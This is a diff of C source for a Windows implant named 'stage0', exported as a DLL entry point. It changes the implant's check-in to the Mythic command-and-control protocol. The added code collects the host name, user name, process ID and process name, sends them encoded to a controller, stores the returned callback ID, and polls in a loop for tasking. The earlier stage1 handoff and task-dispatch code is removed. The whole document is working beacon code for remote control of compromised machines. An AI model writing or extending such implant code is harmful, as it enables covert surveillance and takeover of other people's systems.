@@ -1,5 +1,6 @@
 #include "stage0.h"
 #include "generated_config.h"
+#include <string.h>
 #ifdef STAGE0_DEBUG
 #include <stdio.h>
 #endif
@@ -20,10 +21,28 @@ static DWORD WINAPI s0_thread(LPVOID context) {
     return 0;
 }
 
+static int s0_reply_id(const uint8_t *json, uint32_t length, char id[37]) {
+    static const char marker[] = "\"id\":\"";
+    uint32_t i;
+    if (!json || length < sizeof(marker) - 1 + 36) return 0;
+    for (i = 0; i + sizeof(marker) - 1 + 36 <= length; ++i) {
+        if (memcmp(json + i, marker, sizeof(marker) - 1) == 0) {
+            CopyMemory(id, json + i + sizeof(marker) - 1, 36);
+            id[36] = 0;
+            return 1;
+        }
+    }
+    return 0;
+}
+
 int s0_agent_run(const s0_config *cfg) {
     s0_transport t = {0}; s0_buffer tx = {0}, rx = {0}, result = {0};
-    s0_frame_header h; const uint8_t *payload; uint64_t fp;
-    uint8_t checkin[24] = {0};
+    s0_buffer plain = {0};
+    char callback_id[37], response_id[37], checkin[768];
+    char host[256] = {0}, user[256] = {0}, process_path[MAX_PATH] = {0};
+    char *process_name = process_path;
+    DWORD host_len = sizeof(host), user_len = sizeof(user), process_len;
+    int checkin_len;
     s0_debug(L"starting");
     if (!cfg) { s0_debug(L"missing configuration"); return 0; }
 #ifdef STAGE0_DEBUG
@@ -38,42 +57,57 @@ int s0_agent_run(const s0_config *cfg) {
         s0_debug_error(L"transport open failed", GetLastError()); return 0;
     }
     s0_debug(L"transport open");
-    fp = s0_host_fingerprint();
-    CopyMemory(checkin, &fp, sizeof(fp));
-    CopyMemory(checkin + 8, cfg->payload_id, 16);
-    if (s0_frame_pack(S0_MSG_CHECKIN, 0, 0, checkin, sizeof(checkin), &tx)) {
+    CopyMemory(callback_id, cfg->payload_id, 37);
+    GetComputerNameA(host, &host_len);
+    GetUserNameA(user, &user_len);
+    process_len = GetModuleFileNameA(0, process_path, sizeof(process_path));
+    if (!process_len) process_path[0] = 0;
+    else {
+        char *cursor = process_path;
+        while (*cursor) {
+            if (*cursor == '\\' || *cursor == '/') process_name = cursor + 1;
+            ++cursor;
+        }
+    }
+    checkin_len = wsprintfA(
+        checkin,
+        "{\"action\":\"checkin\",\"uuid\":\"%s\",\"user\":\"%s\","
+        "\"host\":\"%s\",\"pid\":%lu,\"architecture\":\"x64\","
+        "\"process_name\":\"%s\"}",
+        cfg->payload_id, user, host, GetCurrentProcessId(), process_name);
+    if (checkin_len > 0 &&
+        s0_mythic_encode(cfg->payload_id, cfg->key, checkin,
+                         (uint32_t)checkin_len, &tx)) {
         s0_debug(L"sending checkin");
         if (!t.exchange(&t, tx.data, tx.length, &rx))
             s0_debug_error(L"checkin exchange failed", GetLastError());
+        else if (!s0_mythic_decode(cfg->key, rx.data, rx.length,
+                                   response_id, &plain))
+            s0_debug(L"checkin response decode failed");
+        else if (!s0_reply_id(plain.data, plain.length, callback_id))
+            s0_debug(L"checkin response missing callback id");
         else
-            s0_debug(L"checkin response received");
+            s0_debug(L"checkin succeeded");
     }
     for (;;) {
-        if (rx.length && s0_frame_unpack(rx.data, rx.length, &h, &payload)) {
-            if (h.kind == S0_MSG_STAGE1) {
-                s0_handoff_stage1(payload, h.length, cfg); break;
-            }
-            if (h.kind == S0_MSG_TASK && h.length && payload[0] == S0_TASK_EXIT) break;
-            if (h.kind == S0_MSG_TASK &&
-                s0_dispatch_task(payload, h.length, &result) &&
-                s0_frame_pack(S0_MSG_RESULT, 0, h.stream_id,
-                              result.data, result.length, &tx)) {
-                rx.length = result.length = 0;
-                t.exchange(&t, tx.data, tx.length, &rx);
-                continue;
-            }
-        }
         rx.length = 0;
+        plain.length = 0;
         Sleep(cfg->sleep_ms ? cfg->sleep_ms : 1000);
-        if (!s0_frame_pack(S0_MSG_CHECKIN, 1, 0, checkin, sizeof(checkin), &tx)) {
-            s0_debug(L"poll frame failed"); break;
-        }
+        checkin_len = wsprintfA(checkin,
+            "{\"action\":\"get_tasking\",\"tasking_size\":-1,"
+            "\"get_delegate_tasks\":true}");
+        if (!s0_mythic_encode(callback_id, cfg->key, checkin,
+                              (uint32_t)checkin_len, &tx)) break;
         if (!t.exchange(&t, tx.data, tx.length, &rx)) {
             s0_debug_error(L"poll exchange failed", GetLastError()); break;
         }
+        if (!s0_mythic_decode(cfg->key, rx.data, rx.length,
+                              response_id, &plain)) {
+            s0_debug(L"poll response decode failed"); break;
+        }
     }
     t.close(&t); s0_buffer_free(&tx); s0_buffer_free(&rx);
-    s0_buffer_free(&result); return 1;
+    s0_buffer_free(&plain); s0_buffer_free(&result); return 1;
 }
 
 __declspec(dllexport) DWORD WINAPI stage0_start(void *config) {
